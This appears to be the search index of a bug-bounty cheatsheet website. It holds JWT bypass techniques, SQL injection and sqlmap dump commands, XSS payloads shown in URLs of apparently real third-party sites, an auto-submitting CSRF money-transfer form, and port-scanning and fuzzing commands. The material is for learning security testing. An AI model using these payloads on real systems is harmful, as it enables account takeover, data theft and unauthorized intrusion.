{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\ud83d\udc1e Bug Bounty Cheatsheet \ud83d\udccc What is a Bug Bounty? A Bug Bounty program is a deal offered by websites, organizations, and software developers where individuals receive recognition and/or compensation for reporting bugs \u2014 especially security vulnerabilities . Promotes ethical hacking and responsible disclosure. Rewards may include cash , swag , or Hall of Fame listings.","title":"Home"},{"location":"#bug-bounty-cheatsheet","text":"","title":"\ud83d\udc1e Bug Bounty Cheatsheet"},{"location":"#what-is-a-bug-bounty","text":"A Bug Bounty program is a deal offered by websites, organizations, and software developers where individuals receive recognition and/or compensation for reporting bugs \u2014 especially security vulnerabilities . Promotes ethical hacking and responsible disclosure. Rewards may include cash , swag , or Hall of Fame listings.","title":"\ud83d\udccc What is a Bug Bounty?"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/","text":"JWT Vulnerabilities & Techniques \ud83d\udd10 About HS256 HS256 is an old and rarely used symmetric encryption algorithm. Being symmetric , it uses the same key to both encrypt and decrypt. If HS256 is found in use, you may try cracking it . Sometimes, JWT tokens seen in requests are false positives \u2014 they don't actually control access. \ud83d\udd0d JWT Testing Techniques 1. Modifying the Payload You can modify the JWT payload to escalate privileges. Example: Change user:guest \u27a1\ufe0f user:admin { \"id\": 34234214, \"user\": \"admin\" } 2. Changing the Signature Algorithm Alter the JWT algorithm from RS256 to HS256 , HS512 , etc. This can help bypass validations on vulnerable systems. 3. Removing the Signature Set the algorithm to none and remove the signature completely. This results in a token like: Header.Payload. 4. Brute Forcing Weak Signature Keys Use the ticarpi/jwt_tool to brute-force weak keys: python3 jwt_tool.py [JWT_TOKEN] --crack -d [WORDLIST] Refer to online attack books for further fuzzing techniques. \ud83e\uddea Bug Bounty Tip Always create two user accounts . Compare JWT tokens and try accessing other user sessions by tweaking the token.","title":"JWT AUTHENTICATION"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/#jwt-vulnerabilities-techniques","text":"","title":"JWT Vulnerabilities &amp; Techniques"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/#about-hs256","text":"HS256 is an old and rarely used symmetric encryption algorithm. Being symmetric , it uses the same key to both encrypt and decrypt. If HS256 is found in use, you may try cracking it . Sometimes, JWT tokens seen in requests are false positives \u2014 they don't actually control access.","title":"\ud83d\udd10 About HS256"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/#jwt-testing-techniques","text":"","title":"\ud83d\udd0d JWT Testing Techniques"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/#1-modifying-the-payload","text":"You can modify the JWT payload to escalate privileges. Example: Change user:guest \u27a1\ufe0f user:admin { \"id\": 34234214, \"user\": \"admin\" }","title":"1. Modifying the Payload"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/#2-changing-the-signature-algorithm","text":"Alter the JWT algorithm from RS256 to HS256 , HS512 , etc. This can help bypass validations on vulnerable systems.","title":"2. Changing the Signature Algorithm"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/#3-removing-the-signature","text":"Set the algorithm to none and remove the signature completely. This results in a token like: Header.Payload.","title":"3. Removing the Signature"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/#4-brute-forcing-weak-signature-keys","text":"Use the ticarpi/jwt_tool to brute-force weak keys: python3 jwt_tool.py [JWT_TOKEN] --crack -d [WORDLIST] Refer to online attack books for further fuzzing techniques.","title":"4. Brute Forcing Weak Signature Keys"},{"location":"Vulnerabilities/JWT_AUTHENTICATION_BYPASS/#bug-bounty-tip","text":"Always create two user accounts . Compare JWT tokens and try accessing other user sessions by tweaking the token.","title":"\ud83e\uddea Bug Bounty Tip"},{"location":"Vulnerabilities/SQL%20Injection/","text":"SQL Injection Cheat Sheet SQL Injection is a vulnerability that allows attackers to interfere with the queries an application makes to its database. This document outlines different techniques and tools for exploiting SQL Injection vulnerabilities. \ud83e\uddea Manual & Automated Testing Basic SQLi testing starts with either manual payloads or automated tools like SQLmap . Manual techniques include: UNION based attacks ORDER BY clause testing Error-based enumeration \ud83d\udd27 SQLmap Flags: --dbs : Enumerate databases -D [DATABASE NAME] --tables : List tables in a specific database -D [DATABASE] -T [TABLE] --dump : Dump columns and data from a specific table \ud83d\udd76\ufe0f Blind SQL Injection Blind SQLi occurs when the application does not display database errors but still reacts differently based on the query's logic. \ud83d\udd21 SUBSTRING Based Attacks Brute force character by character: sql SELECT substring(database(),1,1) SELECT if(substring(database(),1,1)='a',SLEEP(3),'a') SELECT if(substring(database(),1,1)>'g',SLEEP(3),'a') \ud83e\uddee Boolean Based SQLi Test logic: sql ' AND 1=1 -- - ' AND 1=2 -- - \u23f1\ufe0f Time Based SQLi Time delay if condition is true: sql SELECT SLEEP(10) \ud83d\udca5 Error Based SQLi Example using CASE statement: Conditionally returns 'a' if false: sql SELECT CASE WHEN (condition) THEN '' ELSE 'a' END Further reference: DB Fiddle Example \ud83d\udd75\ufe0f Blind SQLi in Cookies / Sessions Blind SQLi isn't limited to URL parameters. It can be hidden in: Session Tokens Cookies Example: TrackingId=xyz'; SELECT SLEEP(10) -- Explore real-world labs at PortSwigger Web Security Academy for hands-on experience. \ud83e\uddec NoSQL Injection A unique form of injection targeting NoSQL databases like MongoDB . Most common injection points: username password Tips: Consult the MongoDB Docs Logical flaws in queries are often exploited with JSON-based payloads. \u26a0\ufe0f Only test on systems you have explicit permission to test. \u00a9 2025 Daksh Bhagwani | DBugs.org","title":"SQL INJECTION"},{"location":"Vulnerabilities/SQL%20Injection/#sql-injection-cheat-sheet","text":"SQL Injection is a vulnerability that allows attackers to interfere with the queries an application makes to its database. This document outlines different techniques and tools for exploiting SQL Injection vulnerabilities.","title":"SQL Injection Cheat Sheet"},{"location":"Vulnerabilities/SQL%20Injection/#manual-automated-testing","text":"Basic SQLi testing starts with either manual payloads or automated tools like SQLmap . Manual techniques include: UNION based attacks ORDER BY clause testing Error-based enumeration","title":"\ud83e\uddea Manual &amp; Automated Testing"},{"location":"Vulnerabilities/SQL%20Injection/#sqlmap-flags","text":"--dbs : Enumerate databases -D [DATABASE NAME] --tables : List tables in a specific database -D [DATABASE] -T [TABLE] --dump : Dump columns and data from a specific table","title":"\ud83d\udd27 SQLmap Flags:"},{"location":"Vulnerabilities/SQL%20Injection/#blind-sql-injection","text":"Blind SQLi occurs when the application does not display database errors but still reacts differently based on the query's logic.","title":"\ud83d\udd76\ufe0f Blind SQL Injection"},{"location":"Vulnerabilities/SQL%20Injection/#substring-based-attacks","text":"Brute force character by character: sql SELECT substring(database(),1,1) SELECT if(substring(database(),1,1)='a',SLEEP(3),'a') SELECT if(substring(database(),1,1)>'g',SLEEP(3),'a')","title":"\ud83d\udd21 SUBSTRING Based Attacks"},{"location":"Vulnerabilities/SQL%20Injection/#boolean-based-sqli","text":"Test logic: sql ' AND 1=1 -- - ' AND 1=2 -- -","title":"\ud83e\uddee Boolean Based SQLi"},{"location":"Vulnerabilities/SQL%20Injection/#time-based-sqli","text":"Time delay if condition is true: sql SELECT SLEEP(10)","title":"\u23f1\ufe0f Time Based SQLi"},{"location":"Vulnerabilities/SQL%20Injection/#error-based-sqli","text":"Example using CASE statement: Conditionally returns 'a' if false: sql SELECT CASE WHEN (condition) THEN '' ELSE 'a' END Further reference: DB Fiddle Example","title":"\ud83d\udca5 Error Based SQLi"},{"location":"Vulnerabilities/SQL%20Injection/#blind-sqli-in-cookies-sessions","text":"Blind SQLi isn't limited to URL parameters. It can be hidden in: Session Tokens Cookies","title":"\ud83d\udd75\ufe0f Blind SQLi in Cookies / Sessions"},{"location":"Vulnerabilities/SQL%20Injection/#example","text":"TrackingId=xyz'; SELECT SLEEP(10) -- Explore real-world labs at PortSwigger Web Security Academy for hands-on experience.","title":"Example:"},{"location":"Vulnerabilities/SQL%20Injection/#nosql-injection","text":"A unique form of injection targeting NoSQL databases like MongoDB . Most common injection points: username password","title":"\ud83e\uddec NoSQL Injection"},{"location":"Vulnerabilities/SQL%20Injection/#tips","text":"Consult the MongoDB Docs Logical flaws in queries are often exploited with JSON-based payloads. \u26a0\ufe0f Only test on systems you have explicit permission to test. \u00a9 2025 Daksh Bhagwani | DBugs.org","title":"Tips:"},{"location":"Vulnerabilities/XSS/","text":"Cross-Site Scripting (XSS) Cheat Sheet Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by others. This document covers different types of XSS and tools to detect and exploit them. \ud83d\udd0d Parameter-Based XSS Not all XSS vulnerabilities are found via search fields \u2014 many appear in URL parameters. Example: https://www.fenixlight.com/product/index.php?id=37%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&type=7%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E In this example, the id and type parameters are injected with a script payload. \ud83e\uddea URL Path-Based XSS Sometimes the vulnerability lies in the URL path , not just parameters. Example: Original: https://kwabey.com/buy/adorable-sitexcxcxcscscsdc.html Tested: https://kwabey.com/buy/adorable-sitexcxcxcscscsdc.htmlHELLO If HELLO is reflected on the frontend, it can be escalated using: -prompt(8)- \u2699\ufe0f DOM-Based XSS DOM-Based XSS occurs when the vulnerability is within JavaScript running in the page, not in the HTML response. Example: <input type='hidden' id='utm_medium' value=''> Try modifying the URL: view-source:https://example.com/?utm_medium=<img src=x onerror=prompt(1)> If the frontend JavaScript reflects utm_medium content into the DOM unsafely, you're vulnerable. \ud83d\udd75\ufe0f Blind XSS With Blind XSS , the payload doesn't execute immediately. Instead, it gets triggered when viewed in an admin panel or backend dashboard. Steps: Use platforms like https://xss.report/dashboard Inject payloads into input fields, headers, or metadata. Why it matters: If the app stores sensitive data (like tokens) in localStorage/sessionStorage, you can extract it. <script>alert(localStorage.hjUserAttributes)</script> This leads to: CORS \u2192 XSS \u2192 ATO (Account Takeover) \ud83d\udee0\ufe0f Useful Commands & Tools Terminal One-Liner: echo https://www.oshi.pk | gau | gf XSS | uro | gxss | kxss | tee out.txt Tools: python3 loxs.py dalfox - Best auto-scanner for XSS XSStrike - WAF bypass and intelligent payload generation \u26a0\ufe0f Always perform testing on sites you own or have explicit permission to test. \u00a9 2025 Daksh Bhagwani | DBugs.org","title":"XSS"},{"location":"Vulnerabilities/XSS/#cross-site-scripting-xss-cheat-sheet","text":"Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by others. This document covers different types of XSS and tools to detect and exploit them.","title":"Cross-Site Scripting (XSS) Cheat Sheet"},{"location":"Vulnerabilities/XSS/#parameter-based-xss","text":"Not all XSS vulnerabilities are found via search fields \u2014 many appear in URL parameters.","title":"\ud83d\udd0d Parameter-Based XSS"},{"location":"Vulnerabilities/XSS/#example","text":"https://www.fenixlight.com/product/index.php?id=37%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&type=7%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E In this example, the id and type parameters are injected with a script payload.","title":"Example:"},{"location":"Vulnerabilities/XSS/#url-path-based-xss","text":"Sometimes the vulnerability lies in the URL path , not just parameters.","title":"\ud83e\uddea URL Path-Based XSS"},{"location":"Vulnerabilities/XSS/#example_1","text":"Original: https://kwabey.com/buy/adorable-sitexcxcxcscscsdc.html Tested: https://kwabey.com/buy/adorable-sitexcxcxcscscsdc.htmlHELLO If HELLO is reflected on the frontend, it can be escalated using: -prompt(8)-","title":"Example:"},{"location":"Vulnerabilities/XSS/#dom-based-xss","text":"DOM-Based XSS occurs when the vulnerability is within JavaScript running in the page, not in the HTML response.","title":"\u2699\ufe0f DOM-Based XSS"},{"location":"Vulnerabilities/XSS/#example_2","text":"<input type='hidden' id='utm_medium' value=''> Try modifying the URL: view-source:https://example.com/?utm_medium=<img src=x onerror=prompt(1)> If the frontend JavaScript reflects utm_medium content into the DOM unsafely, you're vulnerable.","title":"Example:"},{"location":"Vulnerabilities/XSS/#blind-xss","text":"With Blind XSS , the payload doesn't execute immediately. Instead, it gets triggered when viewed in an admin panel or backend dashboard.","title":"\ud83d\udd75\ufe0f Blind XSS"},{"location":"Vulnerabilities/XSS/#steps","text":"Use platforms like https://xss.report/dashboard Inject payloads into input fields, headers, or metadata.","title":"Steps:"},{"location":"Vulnerabilities/XSS/#why-it-matters","text":"If the app stores sensitive data (like tokens) in localStorage/sessionStorage, you can extract it. <script>alert(localStorage.hjUserAttributes)</script> This leads to: CORS \u2192 XSS \u2192 ATO (Account Takeover)","title":"Why it matters:"},{"location":"Vulnerabilities/XSS/#useful-commands-tools","text":"","title":"\ud83d\udee0\ufe0f Useful Commands &amp; Tools"},{"location":"Vulnerabilities/XSS/#terminal-one-liner","text":"echo https://www.oshi.pk | gau | gf XSS | uro | gxss | kxss | tee out.txt","title":"Terminal One-Liner:"},{"location":"Vulnerabilities/XSS/#tools","text":"python3 loxs.py dalfox - Best auto-scanner for XSS XSStrike - WAF bypass and intelligent payload generation \u26a0\ufe0f Always perform testing on sites you own or have explicit permission to test. \u00a9 2025 Daksh Bhagwani | DBugs.org","title":"Tools:"},{"location":"Vulnerabilities/csrf/","text":"\ud83d\udee1\ufe0f CSRF (Cross-Site Request Forgery) \ud83d\udcd6 Definition CSRF exploits the trust a web app has in the user's browser, making unauthorized actions on behalf of an authenticated user. \u26a0\ufe0f Example Attack <form action=\"https://bank.com/transfer\" method=\"POST\"> <input type=\"hidden\" name=\"to\" value=\"attacker\"> <input type=\"hidden\" name=\"amount\" value=\"1000\"> </form> <script>document.forms[0].submit();</script> \u2705 Mitigations Use CSRF tokens in forms. Set SameSite cookies. Use double submit cookie strategy. Require user interaction or re-authentication for sensitive actions. \ud83d\udd27 Testing Tools: Burp Suite \u2013 Intercept and manipulate CSRF-prone requests. Use \"Generate CSRF PoC\" feature in Burp's Repeater/Proxy. Postman \u2013 Test endpoints with and without CSRF tokens. ```html POST /update_email HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Cookie: sessionid=12345 email=attacker@example.com ```","title":"CSRF"},{"location":"Vulnerabilities/csrf/#csrf-cross-site-request-forgery","text":"","title":"\ud83d\udee1\ufe0f CSRF (Cross-Site Request Forgery)"},{"location":"Vulnerabilities/csrf/#definition","text":"CSRF exploits the trust a web app has in the user's browser, making unauthorized actions on behalf of an authenticated user.","title":"\ud83d\udcd6 Definition"},{"location":"Vulnerabilities/csrf/#example-attack","text":"<form action=\"https://bank.com/transfer\" method=\"POST\"> <input type=\"hidden\" name=\"to\" value=\"attacker\"> <input type=\"hidden\" name=\"amount\" value=\"1000\"> </form> <script>document.forms[0].submit();</script>","title":"\u26a0\ufe0f Example Attack"},{"location":"Vulnerabilities/csrf/#mitigations","text":"Use CSRF tokens in forms. Set SameSite cookies. Use double submit cookie strategy. Require user interaction or re-authentication for sensitive actions.","title":"\u2705 Mitigations"},{"location":"Vulnerabilities/csrf/#testing-tools","text":"Burp Suite \u2013 Intercept and manipulate CSRF-prone requests. Use \"Generate CSRF PoC\" feature in Burp's Repeater/Proxy. Postman \u2013 Test endpoints with and without CSRF tokens. ```html POST /update_email HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Cookie: sessionid=12345 email=attacker@example.com ```","title":"\ud83d\udd27 Testing Tools:"},{"location":"Vulnerabilities/recon/","text":"\ud83d\udd0d Reconnaissance Techniques (Recon) \ud83d\udd17 Passive Recon Gathers information without directly interacting with the target. Tools and Usage: theHarvester \u2013 Gathers emails, subdomains, hosts, and more. bash theHarvester -d example.com -b google Subfinder \u2013 Fast passive subdomain enumeration. bash subfinder -d example.com crt.sh \u2013 Public certificate transparency log viewer. bash curl https://crt.sh/?q=%.example.com&output=json GitHub Search/Dorking \u2013 Search for secrets in code. bash site:github.com \"example.com password\" Waybackurls \u2013 Fetch historical URLs. bash echo example.com | waybackurls Shodan \u2013 Search for devices/servers online. bash shodan search \"http.title:'Example Domain'\" \ud83d\udee0\ufe0f Active Recon Interacts directly with the target. Tools and Usage: Sublist3r \u2013 Subdomain enumeration via OSINT. bash sublist3r -d example.com Nmap \u2013 Network scanner for open ports and services. bash nmap -sV -p- example.com Masscan \u2013 Very fast port scanner. bash masscan -p1-65535 --rate=10000 example.com ffuf \u2013 Fuzzing URLs for hidden files and directories. bash ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt Dirsearch \u2013 Command-line directory brute-forcer. bash python3 dirsearch.py -u https://example.com -e php,html Gobuster \u2013 Directory and DNS scanner. bash gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt Wappalyzer / WhatWeb \u2013 Detects technologies used. bash whatweb example.com ParamSpider \u2013 Finds hidden GET/POST parameters. bash python3 paramspider.py --domain example.com Arjun \u2013 Finds hidden HTTP parameters. bash python3 arjun.py -u https://example.com/search LinkFinder \u2013 Extracts endpoints from JavaScript files. bash python3 linkfinder.py -i https://example.com/script.js -o cli \ud83e\uddf0 Summary of Tools and Purpose Tool Purpose Usage Example theHarvester Email & domain harvesting theHarvester -d example.com -b google Amass Subdomain enum amass enum -d example.com Subfinder Subdomain enum subfinder -d example.com Sublist3r Subdomain enum sublist3r -d example.com Nmap Port scanning nmap -sV -p- example.com Masscan Fast port scan masscan -p1-65535 example.com ffuf Directory fuzzing ffuf -u https://site.com/FUZZ -w wordlist Dirsearch Directory bruteforcing dirsearch -u https://example.com -e php Gobuster Dir & DNS brute force gobuster dir -u https://example.com -w wordlist ParamSpider Hidden param discovery paramspider.py --domain example.com Arjun Param brute-forcing arjun.py -u https://site.com LinkFinder JS endpoint extraction linkfinder.py -i URL -o cli Burp Suite Manual security testing Intercept, modify, generate CSRF PoC Postman API testing Send raw HTTP requests WhatWeb Detect tech stack whatweb example.com","title":"Recon"},{"location":"Vulnerabilities/recon/#reconnaissance-techniques-recon","text":"","title":"\ud83d\udd0d Reconnaissance Techniques (Recon)"},{"location":"Vulnerabilities/recon/#passive-recon","text":"Gathers information without directly interacting with the target.","title":"\ud83d\udd17 Passive Recon"},{"location":"Vulnerabilities/recon/#tools-and-usage","text":"theHarvester \u2013 Gathers emails, subdomains, hosts, and more. bash theHarvester -d example.com -b google Subfinder \u2013 Fast passive subdomain enumeration. bash subfinder -d example.com crt.sh \u2013 Public certificate transparency log viewer. bash curl https://crt.sh/?q=%.example.com&output=json GitHub Search/Dorking \u2013 Search for secrets in code. bash site:github.com \"example.com password\" Waybackurls \u2013 Fetch historical URLs. bash echo example.com | waybackurls Shodan \u2013 Search for devices/servers online. bash shodan search \"http.title:'Example Domain'\"","title":"Tools and Usage:"},{"location":"Vulnerabilities/recon/#active-recon","text":"Interacts directly with the target.","title":"\ud83d\udee0\ufe0f Active Recon"},{"location":"Vulnerabilities/recon/#tools-and-usage_1","text":"Sublist3r \u2013 Subdomain enumeration via OSINT. bash sublist3r -d example.com Nmap \u2013 Network scanner for open ports and services. bash nmap -sV -p- example.com Masscan \u2013 Very fast port scanner. bash masscan -p1-65535 --rate=10000 example.com ffuf \u2013 Fuzzing URLs for hidden files and directories. bash ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt Dirsearch \u2013 Command-line directory brute-forcer. bash python3 dirsearch.py -u https://example.com -e php,html Gobuster \u2013 Directory and DNS scanner. bash gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt Wappalyzer / WhatWeb \u2013 Detects technologies used. bash whatweb example.com ParamSpider \u2013 Finds hidden GET/POST parameters. bash python3 paramspider.py --domain example.com Arjun \u2013 Finds hidden HTTP parameters. bash python3 arjun.py -u https://example.com/search LinkFinder \u2013 Extracts endpoints from JavaScript files. bash python3 linkfinder.py -i https://example.com/script.js -o cli","title":"Tools and Usage:"},{"location":"Vulnerabilities/recon/#summary-of-tools-and-purpose","text":"Tool Purpose Usage Example theHarvester Email & domain harvesting theHarvester -d example.com -b google Amass Subdomain enum amass enum -d example.com Subfinder Subdomain enum subfinder -d example.com Sublist3r Subdomain enum sublist3r -d example.com Nmap Port scanning nmap -sV -p- example.com Masscan Fast port scan masscan -p1-65535 example.com ffuf Directory fuzzing ffuf -u https://site.com/FUZZ -w wordlist Dirsearch Directory bruteforcing dirsearch -u https://example.com -e php Gobuster Dir & DNS brute force gobuster dir -u https://example.com -w wordlist ParamSpider Hidden param discovery paramspider.py --domain example.com Arjun Param brute-forcing arjun.py -u https://site.com LinkFinder JS endpoint extraction linkfinder.py -i URL -o cli Burp Suite Manual security testing Intercept, modify, generate CSRF PoC Postman API testing Send raw HTTP requests WhatWeb Detect tech stack whatweb example.com","title":"\ud83e\uddf0 Summary of Tools and Purpose"},{"location":"nav/getting-started/","text":"Getting Started Installation MkDocs To install MkDocs, run the following command from the command line: pip install mkdocs Installation theme Install the theme using PIP: pip install mkdocs-dracula-theme Activating theme After the theme is installed, edit your mkdocs.yml file and set the theme name to dracula : theme: name: dracula All instructions can be found at draculatheme.com/mkdocs .","title":"Getting Started"},{"location":"nav/getting-started/#getting-started","text":"","title":"Getting Started"},{"location":"nav/getting-started/#installation-mkdocs","text":"To install MkDocs, run the following command from the command line: pip install mkdocs","title":"Installation MkDocs"},{"location":"nav/getting-started/#installation-theme","text":"Install the theme using PIP: pip install mkdocs-dracula-theme","title":"Installation theme"},{"location":"nav/getting-started/#activating-theme","text":"After the theme is installed, edit your mkdocs.yml file and set the theme name to dracula : theme: name: dracula All instructions can be found at draculatheme.com/mkdocs .","title":"Activating theme"}]}